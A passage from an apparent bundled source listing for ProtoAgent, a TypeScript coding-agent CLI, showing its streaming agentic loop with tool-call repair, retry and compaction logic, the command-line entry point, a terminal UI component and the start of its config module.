  // Some providers resend the full accumulated value instead of a delta.
  // These two guards handle that case without corrupting normal incremental deltas.
  if (current === fragment) return current;
  if (fragment.startsWith(current)) return fragment;

  // Normal case: incremental delta, just append.
  // The previous partial-overlap loop was removed because it caused false-positive
  // deduplication: short JSON tokens (e.g. \`", "\`) would coincidentally match the
  // tail of \`current\`, silently stripping characters from valid argument payloads.
  return current + fragment;
}

function collapseRepeatedString(value: string): string {
  if (!value) return value;

  for (let size = 1; size <= Math.floor(value.length / 2); size++) {
    if (value.length % size !== 0) continue;
    const candidate = value.slice(0, size);
    if (candidate.repeat(value.length / size) === value) {
      return candidate;
    }
  }

  return value;
}

function normalizeToolName(name: string, validToolNames: Set<string>): string {
  if (!name) return name;
  if (validToolNames.has(name)) return name;

  const collapsed = collapseRepeatedString(name);
  if (validToolNames.has(collapsed)) {
    return collapsed;
  }

  return name;
}

function extractFirstCompleteJsonValue(value: string): string | null {
  const trimmed = value.trim();
  if (!trimmed) return null;

  const opening = trimmed[0];
  const closing = opening === '{' ? '}' : opening === '[' ? ']' : null;
  if (!closing) return null;

  let depth = 0;
  let inString = false;
  let escaped = false;

  for (let i = 0; i < trimmed.length; i++) {
    const char = trimmed[i];

    if (inString) {
      if (escaped) {
        escaped = false;
      } else if (char === '\\\\') {
        escaped = true;
      } else if (char === '"') {
        inString = false;
      }
      continue;
    }

    if (char === '"') {
      inString = true;
      continue;
    }

    if (char === opening) depth++;
    if (char === closing) depth--;

    if (depth === 0) {
      return trimmed.slice(0, i + 1);
    }
  }

  return null;
}

/**
 * Repair invalid JSON escape sequences in a string value.
 *
 * JSON only allows: \\" \\\\ \\/ \\b \\f \\n \\r \\t \\uXXXX
 * Models sometimes emit \\| \\! \\- etc. (e.g. grep regex args) which make
 * JSON.parse throw, and Anthropic strict-validates tool_call arguments on
 * every subsequent request, bricking the session permanently.
 *
 * We double the backslash for any \\X where X is not a valid JSON escape char.
 */
function repairInvalidEscapes(value: string): string {
  // Match a backslash followed by any character that is NOT a valid JSON escape
  // Valid escapes: " \\ / b f n r t u
  return value.replace(/\\\\([^"\\\\\\/bfnrtu])/g, '\\\\\\\\\$1');
}

function normalizeJsonArguments(argumentsText: string): string {
  const trimmed = argumentsText.trim();
  if (!trimmed) return argumentsText;

  try {
    JSON.parse(trimmed);
    return trimmed;
  } catch {
    // Fall through to repair heuristics.
  }

  const collapsed = collapseRepeatedString(trimmed);
  if (collapsed !== trimmed) {
    try {
      JSON.parse(collapsed);
      return collapsed;
    } catch {
      // Fall through to next heuristic.
    }
  }

  const firstJsonValue = extractFirstCompleteJsonValue(trimmed);
  if (firstJsonValue) {
    try {
      JSON.parse(firstJsonValue);
      return firstJsonValue;
    } catch {
      // Give up and return the original text below.
    }
  }

  // Heuristic: repair invalid escape sequences (e.g. \\| from grep regex args)
  const repaired = repairInvalidEscapes(trimmed);
  if (repaired !== trimmed) {
    try {
      JSON.parse(repaired);
      return repaired;
    } catch {
      // Try repair + first-value extraction together
      const repairedFirst = extractFirstCompleteJsonValue(repaired);
      if (repairedFirst) {
        try {
          JSON.parse(repairedFirst);
          return repairedFirst;
        } catch { /* give up */ }
      }
    }
  }

  return argumentsText;
}

function sanitizeToolCall(
  toolCall: any,
  validToolNames: Set<string>
): { toolCall: any; changed: boolean } {
  const originalName = toolCall.function?.name || '';
  const originalArgs = toolCall.function?.arguments || '';
  const normalizedName = normalizeToolName(originalName, validToolNames);
  const normalizedArgs = normalizeJsonArguments(originalArgs);
  const changed = normalizedName !== originalName || normalizedArgs !== originalArgs;

  if (!changed) {
    return { toolCall, changed: false };
  }

  return {
    changed: true,
    toolCall: {
      ...toolCall,
      function: {
        ...toolCall.function,
        name: normalizedName,
        arguments: normalizedArgs,
      },
    },
  };
}

function sanitizeMessagesForRetry(
  messages: Message[],
  validToolNames: Set<string>
): { messages: Message[]; changed: boolean } {
  let changed = false;

  const sanitizedMessages = messages.map((message) => {
    const msgAny = message as any;
    if (message.role !== 'assistant' || !Array.isArray(msgAny.tool_calls) || msgAny.tool_calls.length === 0) {
      return message;
    }

    const nextToolCalls = msgAny.tool_calls.map((toolCall: any) => {
      const sanitized = sanitizeToolCall(toolCall, validToolNames);
      changed = changed || sanitized.changed;
      return sanitized.toolCall;
    });

    return {
      ...msgAny,
      tool_calls: nextToolCalls,
    } as Message;
  });

  return { messages: sanitizedMessages, changed };
}

/**
 * Remove orphaned tool result messages that don't have a matching tool_call_id
 * in any assistant message. This happens when messages are truncated and the
 * assistant's tool_calls are removed but the tool results remain.
 */
function removeOrphanedToolResults(messages: Message[]): { messages: Message[]; changed: boolean } {
  // Collect all valid tool_call_ids from assistant messages
  const validToolCallIds = new Set<string>();
  for (const message of messages) {
    const msgAny = message as any;
    if (message.role === 'assistant' && Array.isArray(msgAny.tool_calls)) {
      for (const tc of msgAny.tool_calls) {
        if (tc.id) {
          validToolCallIds.add(tc.id);
        }
      }
    }
  }

  // Filter out tool messages with orphaned tool_call_ids
  const filteredMessages = messages.filter((message) => {
    const msgAny = message as any;
    if (message.role === 'tool' && msgAny.tool_call_id) {
      const isOrphaned = !validToolCallIds.has(msgAny.tool_call_id);
      if (isOrphaned) {
        logger.warn('Removing orphaned tool result', {
          tool_call_id: msgAny.tool_call_id,
          contentPreview: msgAny.content?.slice(0, 100),
        });
      }
      return !isOrphaned;
    }
    return true;
  });

  return { messages: filteredMessages, changed: filteredMessages.length !== messages.length };
}

function getValidToolNames(): Set<string> {
  return new Set(
    [...getAllTools(), subAgentTool]
      .map((tool: any) => tool.function?.name)
      .filter((name: string | undefined): name is string => Boolean(name))
  );
}

/**
 * Process a single user input through the agentic loop.
 *
 * Takes the full conversation history (including system message),
 * appends the user message, runs the loop, and returns the updated
 * message history.
 *
 * The \`onEvent\` callback is called for each event (text deltas,
 * tool calls, usage info, etc.) so the UI can render progress.
 */
export async function runAgenticLoop(
  client: OpenAI,
  model: string,
  messages: Message[],
  userInput: string,
  onEvent: AgentEventHandler,
  options: AgenticLoopOptions = {}
): Promise<Message[]> {
  const maxIterations = options.maxIterations ?? 100;
  const pricing = options.pricing;
  const abortSignal = options.abortSignal;
  const sessionId = options.sessionId;
  const requestDefaults = options.requestDefaults || {};

  // The same AbortSignal is passed into every OpenAI SDK call and every
  // sleepWithAbort() across all loop iterations and sub-agent calls.
  // The SDK attaches an 'abort' listener per request, so on a long run
  // the default limit of 10 listeners is quickly exceeded, producing the
  // MaxListenersExceededWarning.  AbortSignal is a Web API EventTarget,
  // not a Node EventEmitter, so the instance method .setMaxListeners()
  // doesn't exist on it — use the standalone setMaxListeners() from
  // node:events instead, which handles both EventEmitter and EventTarget.
  if (abortSignal) {
    setMaxListeners(0, abortSignal); // 0 = unlimited, scoped to this signal only
  }

  // Note: userInput is passed for context/logging but user message should already be in messages array
  // (added by the caller in handleSubmit for immediate UI display)
  const updatedMessages: Message[] = [...messages];

  // Refresh system prompt to pick up any new skills or project changes
  const newSystemPrompt = await generateSystemPrompt();
  const systemMsgIndex = updatedMessages.findIndex((m) => m.role === 'system');
  if (systemMsgIndex !== -1) {
    updatedMessages[systemMsgIndex] = { role: 'system', content: newSystemPrompt } as Message;
  }

  let iterationCount = 0;
  let repairRetryCount = 0;
  let contextRetryCount = 0;
  let retriggerCount = 0;
  let truncateRetryCount = 0;
  let continueRetryCount = 0;
  const MAX_RETRIGGERS = 3;
  const MAX_TRUNCATE_RETRIES = 5;
  const MAX_CONTINUE_RETRIES = 1;
  const validToolNames = getValidToolNames();

  while (iterationCount < maxIterations) {
    // Check if abort was requested
    if (abortSignal?.aborted) {
      logger.debug('Agentic loop aborted by user');
      emitAbortAndFinish(onEvent);
      return updatedMessages;
    }

    iterationCount++;

    // Check for compaction
    if (pricing) {
      const contextInfo = getContextInfo(updatedMessages, pricing);
      if (contextInfo.needsCompaction) {
        const compacted = await compactIfNeeded(
          client,
          model,
          updatedMessages,
          pricing.contextWindow,
          contextInfo.currentTokens,
          requestDefaults,
          sessionId
        );
        // Replace messages in-place
        updatedMessages.length = 0;
        updatedMessages.push(...compacted);
      }
    }

    // Declare assistantMessage outside try block so it's accessible in catch
    let assistantMessage: any;

    try {
      // Build tools list: core tools + sub-agent tool + dynamic (MCP) tools
      const allTools = [...getAllTools(), subAgentTool];

      logger.info('Making API request', {
        model,
        toolsCount: allTools.length,
        messagesCount: updatedMessages.length,
      });

      // Log message structure for debugging provider compatibility
      for (const msg of updatedMessages) {
        const m = msg as any;
        if (m.role === 'tool') {
          logger.trace('Message payload', {
            role: m.role,
            tool_call_id: m.tool_call_id,
            contentLength: m.content?.length,
            contentPreview: m.content?.slice(0, 100),
          });
        } else if (m.role === 'assistant' && m.tool_calls?.length) {
          logger.trace('Message payload', {
            role: m.role,
            toolCalls: m.tool_calls.map((tc: any) => ({
              id: tc.id,
              name: tc.function?.name,
              argsLength: tc.function?.arguments?.length,
            })),
          });
        } else {
          logger.trace('Message payload', {
            role: m.role,
            contentLength: m.content?.length,
          });
        }
      }

        const stream = await client.chat.completions.create({
         ...requestDefaults,
         model,
         messages: updatedMessages,
         tools: allTools,
         tool_choice: 'auto',
         stream: true,
         stream_options: { include_usage: true },
       }, {
        signal: abortSignal,
      });

      // Accumulate the streamed response
      assistantMessage = {
        role: 'assistant',
        content: '',
        tool_calls: [],
      };
      let streamedContent = '';
      let hasToolCalls = false;
      let actualUsage: OpenAI.CompletionUsage | undefined;

      for await (const chunk of stream) {
        const delta = chunk.choices[0]?.delta;

        if (chunk.usage) {
          actualUsage = chunk.usage;
        }

        // Stream text content (and return to UI for immediate display via onEvent)
        if (delta?.content) {
          streamedContent += delta.content;
          assistantMessage.content = streamedContent;
          if (!hasToolCalls) {
            onEvent({ type: 'text_delta', content: delta.content });
          }
        }

        // Accumulate tool calls across stream chunks
        if (delta?.tool_calls) {
          hasToolCalls = true;
          for (const tc of delta.tool_calls) {
            const idx = tc.index || 0;
            if (!assistantMessage.tool_calls[idx]) {
              assistantMessage.tool_calls[idx] = {
                id: '',
                type: 'function',
                function: { name: '', arguments: '' },
              };
            }
            if (tc.id) assistantMessage.tool_calls[idx].id = tc.id;
            if (tc.function?.name) {
              assistantMessage.tool_calls[idx].function.name = appendStreamingFragment(
                assistantMessage.tool_calls[idx].function.name,
                tc.function.name
              );
            }
            if (tc.function?.arguments) {
              assistantMessage.tool_calls[idx].function.arguments = appendStreamingFragment(
                assistantMessage.tool_calls[idx].function.arguments,
                tc.function.arguments
              );
            }
            // Gemini 3+ models include an \`extra_content\` field on tool calls
            // containing a \`thought_signature\`. This MUST be preserved and sent
            // back in subsequent requests, otherwise Gemini returns a 400.
            // See: https://ai.google.dev/gemini-api/docs/openai
            // See also: https://gist.github.com/thomasgauvin/3cfe8e907c957fba4e132e6cf0f06292
            if ((tc as any).extra_content) {
              assistantMessage.tool_calls[idx].extra_content = (tc as any).extra_content;
            }
          }
        }
      }

      // Log API response with usage info at INFO level
      {
        const inputTokens = actualUsage?.prompt_tokens ?? estimateConversationTokens(updatedMessages);
        const outputTokens = actualUsage?.completion_tokens ?? estimateTokens(assistantMessage.content || '');
        const cachedTokens = (actualUsage as any)?.prompt_tokens_details?.cached_tokens;
        const cost = pricing
          ? createUsageInfo(inputTokens, outputTokens, pricing, cachedTokens).estimatedCost
          : 0;
        const contextPercent = pricing
          ? getContextInfo(updatedMessages, pricing).utilizationPercentage
          : 0;

        logger.info('Received API response', {
          model,
          inputTokens,
          outputTokens,
          cachedTokens,
          cost: cost > 0 ? \`\$\${cost.toFixed(4)}\` : 'N/A',
          contextPercent: contextPercent > 0 ? \`\${contextPercent.toFixed(1)}%\` : 'N/A',
          hasToolCalls: assistantMessage.tool_calls.length > 0,
          contentLength: assistantMessage.content?.length || 0,
        });

        onEvent({
          type: 'usage',
          usage: { inputTokens, outputTokens, cost, contextPercent },
        });
      }

      // Log the full assistant message for debugging
      logger.debug('Assistant response details', {
        contentLength: assistantMessage.content?.length || 0,
        contentPreview: assistantMessage.content?.slice(0, 200) || '(empty)',
        toolCallsCount: assistantMessage.tool_calls?.length || 0,
        toolCalls: assistantMessage.tool_calls?.map((tc: any) => ({
          id: tc.id,
          name: tc.function?.name,
          argsPreview: tc.function?.arguments?.slice(0, 100),
        })),
      });

      // Handle tool calls
      if (assistantMessage.tool_calls.length > 0) {
        // Reset retrigger count on valid tool call response
        retriggerCount = 0;
        // Clean up empty tool_calls entries (from sparse array)
        assistantMessage.tool_calls = assistantMessage.tool_calls.filter(Boolean);
        assistantMessage.tool_calls = assistantMessage.tool_calls.map((toolCall: any) => {
          const sanitized = sanitizeToolCall(toolCall, validToolNames);
          if (sanitized.changed) {
            logger.warn('Sanitized streamed tool call', {
              originalName: toolCall.function?.name,
              sanitizedName: sanitized.toolCall.function?.name,
            });
          }
          return sanitized.toolCall;
        });

        // Validate that all tool calls have valid JSON arguments
        const invalidToolCalls = assistantMessage.tool_calls.filter((tc: any) => {
          const args = tc.function?.arguments;
          if (!args) return false; // Empty args is valid
          try {
            JSON.parse(args);
            return false; // Valid JSON
          } catch {
            return true; // Invalid JSON
          }
        });

        if (invalidToolCalls.length > 0) {
          logger.warn('Assistant produced tool calls with invalid JSON, skipping this turn', {
            invalidToolCalls: invalidToolCalls.map((tc: any) => ({
              name: tc.function?.name,
              argsPreview: tc.function?.arguments?.slice(0, 100),
            })),
          });
          // Don't add the malformed assistant message to conversation
          // The loop will continue and retry
          continue;
        }

        logger.info('Model returned tool calls', {
          count: assistantMessage.tool_calls.length,
          tools: assistantMessage.tool_calls.map((tc: any) => tc.function?.name).join(', '),
        });

        updatedMessages.push(assistantMessage);

        // Track which tool_call_ids still need a tool result message.
        // This set is used to inject stub responses on abort, preventing
        // orphaned tool_call_ids from permanently bricking the session.
        const pendingToolCallIds = new Set<string>(
          assistantMessage.tool_calls.map((tc: any) => tc.id as string)
        );

        const injectStubsForPendingToolCalls = () => {
          for (const id of pendingToolCallIds) {
            updatedMessages.push({
              role: 'tool',
              tool_call_id: id,
              content: 'Aborted by user.',
            } as any);
          }
        };

        for (const toolCall of assistantMessage.tool_calls) {
          // Check abort between tool calls
          if (abortSignal?.aborted) {
            logger.debug('Agentic loop aborted between tool calls');
            injectStubsForPendingToolCalls();
            emitAbortAndFinish(onEvent);
            return updatedMessages;
          }

          const { name, arguments: argsStr } = toolCall.function;

          onEvent({
            type: 'tool_call',
            toolCall: { id: toolCall.id, name, args: argsStr, status: 'running' },
          });

          try {
            const args = JSON.parse(argsStr);
            let result: string;

            // Handle sub-agent tool specially
            if (name === 'sub_agent') {
              const subProgress: SubAgentProgressHandler = (evt) => {
                onEvent({
                  type: 'sub_agent_iteration',
                  subAgentTool: { tool: evt.tool, status: evt.status, iteration: evt.iteration, args: evt.args },
                });
              };
              const subResult = await runSubAgent(
                client,
                model,
                args.task,
                args.max_iterations,
                requestDefaults,
                subProgress,
                abortSignal,
                pricing,
              );
              result = subResult.response;
              // Emit sub-agent usage for the UI to add to total cost
              if (subResult.usage.inputTokens > 0 || subResult.usage.outputTokens > 0) {
                onEvent({
                  type: 'sub_agent_iteration',
                  subAgentUsage: subResult.usage,
                });
              }
            } else {
              result = await handleToolCall(name, args, { sessionId, abortSignal });
            }

            logger.info('Tool completed', {
              tool: name,
              resultLength: result.length,
            });

            updatedMessages.push({
              role: 'tool',
              tool_call_id: toolCall.id,
              content: result,
            } as any);
            pendingToolCallIds.delete(toolCall.id);

            onEvent({
              type: 'tool_result',
              toolCall: { id: toolCall.id, name, args: argsStr, status: 'done', result },
            });
          } catch (err) {
            const errMsg = err instanceof Error ? err.message : String(err);

            updatedMessages.push({
              role: 'tool',
              tool_call_id: toolCall.id,
              content: \`Error: \${errMsg}\`,
            } as any);
            pendingToolCallIds.delete(toolCall.id);

            // If the tool was aborted, inject stubs for remaining pending calls and stop
            if (abortSignal?.aborted || (err instanceof Error && (err.name === 'AbortError' || err.message === 'Operation aborted'))) {
              logger.debug('Agentic loop aborted during tool execution');
              injectStubsForPendingToolCalls();
              emitAbortAndFinish(onEvent);
              return updatedMessages;
            }

            onEvent({
              type: 'tool_result',
              toolCall: { id: toolCall.id, name, args: argsStr, status: 'error', result: errMsg },
            });
          }
        }

        // Signal UI that this iteration's tool calls are all done,
        // so it can flush completed messages to static output.
        onEvent({ type: 'iteration_done' });

        // Continue loop — let the LLM process tool results
        continue;
      }

      // Plain text response — we're done
      if (assistantMessage.content) {
        updatedMessages.push({
          role: 'assistant',
          content: assistantMessage.content,
        } as Message);
        // Reset retrigger count on valid content response
        retriggerCount = 0;
      }

      // Check if we need to retrigger: if the last message is a tool result
      // but we got no assistant response (empty content, no tool_calls), the AI
      // may have stopped prematurely. Inject a 'continue' prompt and retry.
      const lastMessage = updatedMessages[updatedMessages.length - 1];
      if (lastMessage?.role === 'tool' && retriggerCount < MAX_RETRIGGERS) {
        retriggerCount++;
        logger.warn('AI stopped after tool call without responding; retriggering', {
          retriggerCount,
          maxRetriggers: MAX_RETRIGGERS,
          lastMessageRole: lastMessage.role,
          assistantContent: assistantMessage.content || '(empty)',
          hasToolCalls: assistantMessage.tool_calls.length > 0,
        });
        // Inject a 'continue' prompt to help the AI continue
        updatedMessages.push({
          role: 'user',
          content: 'Please continue.',
        } as Message);
        continue;
      }

      repairRetryCount = 0;
      retriggerCount = 0;
      onEvent({ type: 'done' });
      return updatedMessages;

      } catch (apiError: any) {
      if (abortSignal?.aborted || apiError?.name === 'AbortError' || apiError?.message === 'Operation aborted') {
        logger.debug('Agentic loop request aborted');
        // If we have a partial assistant message with tool_calls, we need to
        // add it to the conversation history before returning, otherwise the
        // message sequence will be invalid (tool results without assistant tool_calls).
        if (assistantMessage && (assistantMessage.content || assistantMessage.tool_calls?.length > 0)) {
          // Clean up empty tool_calls entries
          if (assistantMessage.tool_calls?.length > 0) {
            assistantMessage.tool_calls = assistantMessage.tool_calls.filter(Boolean);
            // Filter out tool calls with malformed/incomplete JSON arguments
            assistantMessage.tool_calls = assistantMessage.tool_calls.filter((tc: any) => {
              const args = tc.function?.arguments;
              if (!args) return true; // No args is valid
              try {
                JSON.parse(args);
                return true; // Valid JSON
              } catch {
                logger.warn('Filtering out tool call with malformed JSON arguments due to abort', {
                  tool: tc.function?.name,
                  argsPreview: args.slice(0, 100),
                });
                return false; // Invalid JSON, filter out
              }
            });
          }
          // Only add the assistant message if we have content or valid tool calls
          if (assistantMessage.content || assistantMessage.tool_calls?.length > 0) {
            updatedMessages.push(assistantMessage);
          }
        }
        emitAbortAndFinish(onEvent);
        return updatedMessages;
      }

      const errMsg = apiError?.message || 'Unknown API error';

      // Try to extract response body for more details
      let responseBody: string | undefined;
      try {
        if (apiError?.response) {
          responseBody = JSON.stringify(apiError.response);
        } else if (apiError?.error) {
          responseBody = JSON.stringify(apiError.error);
        }
      } catch { /* ignore */ }

      logger.error(\`API error: \${errMsg}\`, {
        status: apiError?.status,
        code: apiError?.code,
        responseBody,
        headers: apiError?.headers ? Object.fromEntries(
          Object.entries(apiError.headers).filter(([k]) =>
            ['content-type', 'x-error', 'retry-after'].includes(k.toLowerCase())
          )
        ) : undefined,
      });

      // Log the last few messages to help debug format issues
      logger.debug('Messages at time of error', {
        lastMessages: updatedMessages.slice(-3).map((m: any) => ({
          role: m.role,
          hasToolCalls: !!(m.tool_calls?.length),
          tool_call_id: m.tool_call_id,
          contentPreview: m.content?.slice(0, 150),
        })),
      });

      const retryableStatus = apiError?.status === 408 || apiError?.status === 409 || apiError?.status === 425;
      const retryableCode = ['ECONNRESET', 'ECONNABORTED', 'ETIMEDOUT', 'ENETUNREACH', 'EAI_AGAIN'].includes(apiError?.code);

      // Handle 400 errors: try sanitization first, then truncate messages
      if (apiError?.status === 400) {
        // Try sanitization first
        if (repairRetryCount < 2) {
          const sanitized = sanitizeMessagesForRetry(updatedMessages, getValidToolNames());
          if (sanitized.changed) {
            repairRetryCount++;
            updatedMessages.length = 0;
            updatedMessages.push(...sanitized.messages);
            logger.warn('400 response after malformed tool payload; retrying with sanitized messages', {
              repairRetryCount,
            });
            // Silently retry without showing error to user
            continue;
          }
        }

        // Try removing orphaned tool results
        const orphanedRemoved = removeOrphanedToolResults(updatedMessages);
        if (orphanedRemoved.changed) {
          updatedMessages.length = 0;
          updatedMessages.push(...orphanedRemoved.messages);
          logger.warn('400 response after orphaned tool results; retrying with cleaned messages');
          // Silently retry without showing error to user
          continue;
        }

        // If sanitization didn't help, try removing messages one at a time (up to 5)
        if (truncateRetryCount < MAX_TRUNCATE_RETRIES) {
          truncateRetryCount++;
          const removedCount = Math.min(1, Math.max(0, updatedMessages.length - 2)); // Remove 1 at a time, keep system + at least 1 user
          if (removedCount > 0) {
            const removed = updatedMessages.splice(-removedCount);
            logger.debug('400 error: removing message from history to attempt fix', {
              truncateRetryCount,
              maxRetries: MAX_TRUNCATE_RETRIES,
              removedCount,
              removedRoles: removed.map((m: any) => m.role),
              removedPreviews: removed.map((m: any) => ({
                role: m.role,
                content: m.content?.slice(0, 100),
                tool_calls: m.tool_calls?.map((tc: any) => tc.function?.name),
              })),
            });
            // Silently retry without showing error to user
            continue;
          }
        }

        // After truncation retries exhausted, try adding a "continue" message
        if (continueRetryCount < MAX_CONTINUE_RETRIES) {
          continueRetryCount++;
          updatedMessages.push({ role: 'user', content: 'continue' } as Message);
          logger.warn('400 error: adding "continue" message to retry', {
            continueRetryCount,
            messageCount: updatedMessages.length,
          });
          onEvent({
            type: 'error',
            error: 'Request failed. Retrying with "continue"...',
            transient: true,
          });
          continue;
        }
      }

      // Handle context-window-exceeded (prompt too long) — attempt forced compaction
      // This fires when our token estimate was too low (e.g. base64 images from MCP tools)
      // and the request actually hit the hard provider limit.
      const isContextTooLong =
        apiError?.status === 400 &&
        typeof errMsg === 'string' &&
        /prompt.{0,30}too long|context.{0,30}length|maximum.{0,30}token|tokens?.{0,10}exceed/i.test(errMsg);

      if (isContextTooLong && contextRetryCount < 2) {
        contextRetryCount++;
        logger.warn(\`Prompt too long (attempt \${contextRetryCount}); forcing compaction\`, { errMsg });
        onEvent({
          type: 'error',
          error: 'Prompt too long. Compacting conversation and retrying...',
          transient: true,
        });

        if (pricing) {
          // Use the normal LLM-based compaction path
          try {
            const compacted = await compactIfNeeded(
              client, model, updatedMessages, pricing.contextWindow,
              // Pass the context window itself as currentTokens to force compaction
              pricing.contextWindow,
              requestDefaults, sessionId
            );
            updatedMessages.length = 0;
            updatedMessages.push(...compacted);
          } catch (compactErr) {
            logger.error(\`Forced compaction failed: \${compactErr}\`);
            // Fall through to truncation fallback below
          }
        }

        // Fallback: truncate any tool result messages whose content looks like
        // base64 or is extremely large (e.g. MCP screenshot data)
        const MAX_TOOL_RESULT_CHARS = 20_000;
        for (let i = 0; i < updatedMessages.length; i++) {
          const m = updatedMessages[i] as any;
          if (m.role === 'tool' && typeof m.content === 'string' && m.content.length > MAX_TOOL_RESULT_CHARS) {
            updatedMessages[i] = {
              ...m,
              content: m.content.slice(0, MAX_TOOL_RESULT_CHARS) + '\\n... (truncated — content was too large)',
            };
          }
        }

        continue;
      }

      // Retry on 429 (rate limit) with backoff
      if (apiError?.status === 429) {
        const retryAfter = parseInt(apiError?.headers?.['retry-after'] || '5', 10);
        const backoff = Math.min(retryAfter * 1000, 60_000);
        logger.info(\`Rate limited, retrying in \${backoff / 1000}s...\`);
        onEvent({ type: 'error', error: \`Rate limited. Retrying in \${backoff / 1000}s...\`, transient: true });
        await sleepWithAbort(backoff, abortSignal);
        continue;
      }

      // Retry on transient request failures
      if (apiError?.status >= 500 || retryableStatus || retryableCode) {
        const backoff = Math.min(2 ** iterationCount * 1000, 30_000);
        logger.info(\`Request failed, retrying in \${backoff / 1000}s...\`);
        onEvent({ type: 'error', error: \`Request failed. Retrying in \${backoff / 1000}s...\`, transient: true });
        await sleepWithAbort(backoff, abortSignal);
        continue;
      }

      // 400 error that couldn't be fixed by sanitization or truncation
      if (apiError?.status === 400) {
        onEvent({
          type: 'error',
          error: \`Request failed: \${errMsg}\\n\\nThe conversation history could not be automatically repaired. Try /clear to start fresh.\`,
          transient: false,
        });
        onEvent({ type: 'done' });
        return updatedMessages;
      }

      // Non-retryable error
      onEvent({ type: 'error', error: errMsg });
      onEvent({ type: 'done' });
      return updatedMessages;
    }
  }

  onEvent({ type: 'error', error: 'Maximum iteration limit reached.' });
  onEvent({ type: 'done' });
  return updatedMessages;
}

/**
 * Initialize the conversation with the system prompt.
 */
export async function initializeMessages(): Promise<Message[]> {
  const systemPrompt = await generateSystemPrompt();
  return [{ role: 'system', content: systemPrompt } as Message];
}
`,
  },
  {
    path: "src/cli.tsx",
    content: `#!/usr/bin/env node
/**
 * CLI entry point for ProtoAgent.
 *
 * Parses command-line flags and launches either the main chat UI
 * or the configuration wizard.
 */

import process from 'node:process';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { readFileSync } from 'node:fs';
import React from 'react';
import { render } from 'ink';
import { Command } from 'commander';
import { App } from './App.js';
import { ConfigureComponent, InitComponent, readConfig, writeConfig, writeInitConfig } from './config.js';

// Get package.json version
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const packageJson: { version: string } = JSON.parse(
  readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8')
);

const program = new Command();

program
  .description('ProtoAgent — a simple, hackable coding agent CLI')
  .version(packageJson.version)
  .option('--dangerously-skip-permissions', 'Auto-approve all file writes and shell commands')
  .option('--log-level <level>', 'Log level: TRACE, DEBUG, INFO, WARN, ERROR', 'DEBUG')
  .option('--session <id>', 'Resume a previous session by ID')
  .action((options) => {
    // Default action - start the main app
    render(
      <App
        dangerouslySkipPermissions={options.dangerouslySkipPermissions || false}
        logLevel={options.logLevel}
        sessionId={options.session}
      />
    );
  });

// Configure subcommand
program
  .command('configure')
  .description('Configure AI model and API key settings')
  .option('--project', 'Write <cwd>/.protoagent/protoagent.jsonc')
  .option('--user', 'Write the shared user protoagent.jsonc')
  .option('--provider <id>', 'Provider id to configure')
  .option('--model <id>', 'Model id to configure')
  .option('--api-key <key>', 'Explicit API key to store in protoagent.jsonc')
  .action((options) => {
    if (options.project || options.user || options.provider || options.model || options.apiKey) {
      if (options.project && options.user) {
        console.error('Choose only one of --project or --user.');
        process.exitCode = 1;
        return;
      }
      if (!options.provider || !options.model) {
        console.error('Non-interactive configure requires --provider and --model.');
        process.exitCode = 1;
        return;
      }

      const target = options.project ? 'project' : 'user';
      const resultPath = writeConfig(
        {
          provider: options.provider,
          model: options.model,
          ...(typeof options.apiKey === 'string' && options.apiKey.trim() ? { apiKey: options.apiKey.trim() } : {}),
        },
        target,
      );

      console.log('Configured ProtoAgent:');
      console.log(resultPath);
      const selected = readConfig(target);
      if (selected) {
        console.log(\`\${selected.provider} / \${selected.model}\`);
      }
      return;
    }

    render(<ConfigureComponent />);
  });

program
  .command('init')
  .description('Create a project-local or shared ProtoAgent runtime config')
  .option('--project', 'Write <cwd>/.protoagent/protoagent.jsonc')
  .option('--user', 'Write the shared user protoagent.jsonc')
  .option('--force', 'Overwrite an existing target file')
  .action((options) => {
    if (options.project || options.user) {
      if (options.project && options.user) {
        console.error('Choose only one of --project or --user.');
        process.exitCode = 1;
        return;
      }

      const result = writeInitConfig(options.project ? 'project' : 'user', process.cwd(), {
        overwrite: Boolean(options.force),
      });
      const message = result.status === 'created'
        ? 'Created ProtoAgent config:'
        : result.status === 'overwritten'
          ? 'Overwrote ProtoAgent config:'
          : 'ProtoAgent config already exists:';
      console.log(message);
      console.log(result.path);
      return;
    }

    render(<InitComponent />);
  });

program.parse(process.argv);
`,
  },
  {
    path: "src/components/LeftBar.tsx",
    content: `/**
 * LeftBar — renders a bold green vertical bar (│) on the left side of
 * content, like a GitHub "note" callout. The bar stretches to match the
 * full height of the content by measuring the content box after each render
 * and repeating the │ character once per row.
 *
 * Uses Ink's measureElement (available in stock Ink) rather than a Box
 * border, so it adds zero extra border lines and avoids ghosting on resize.
 */

import React, { useRef, useState, useLayoutEffect } from 'react';
import { Box, Text, measureElement } from 'ink';
import type { DOMElement } from 'ink';

export interface LeftBarProps {
  color?: string;
  children: React.ReactNode;
  marginTop?: number;
  marginBottom?: number;
}

export const LeftBar: React.FC<LeftBarProps> = ({
  color = 'green',
  children,
  marginTop = 0,
  marginBottom = 0,
}) => {
  const contentRef = useRef<DOMElement>(null);
  const [height, setHeight] = useState(1);

  useLayoutEffect(() => {
    if (contentRef.current) {
      try {
        const { height: h } = measureElement(contentRef.current);
        if (h > 0) setHeight(h);
      } catch {
        // measureElement can throw before layout is complete; keep previous height
      }
    }
  });

  const bar = Array.from({ length: height }, () => '│').join('\\n');

  return (
    <Box flexDirection="row" marginTop={marginTop} marginBottom={marginBottom}>
      <Box flexDirection="column" marginRight={1}>
        <Text color={color} bold>{bar}</Text>
      </Box>
      <Box ref={contentRef} flexDirection="column" flexGrow={1}>
        {children}
      </Box>
    </Box>
  );
};
`,
  },
  {
    path: "src/config.tsx",
    content: `import { readFileSync, existsSync, mkdirSync, writeFileSync, chmodSync } from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import React, { useState } from 'react';
import { Box, Text } from 'ink';
import { Select, TextInput, PasswordInput } from '@inkjs/ui';
import { parse } from 'jsonc-parser';
import { getActiveRuntimeConfigPath, type RuntimeConfigFile, type RuntimeProviderConfig } from './runtime-config.js';
import { getAllProviders, getProvider } from './providers.js';

export interface Config {
  provider: string;
  model: string;
  apiKey?: string;
}

export type InitConfigTarget = 'project' | 'user';
export type InitConfigWriteStatus = 'created' | 'exists' | 'overwritten';

const CONFIG_DIR_MODE = 0o700;
const CONFIG_FILE_MODE = 0o600;

function hardenPermissions(targetPath: string, mode: number): void {
  if (process.platform === 'win32') return;
  chmodSync(targetPath, mode);
}

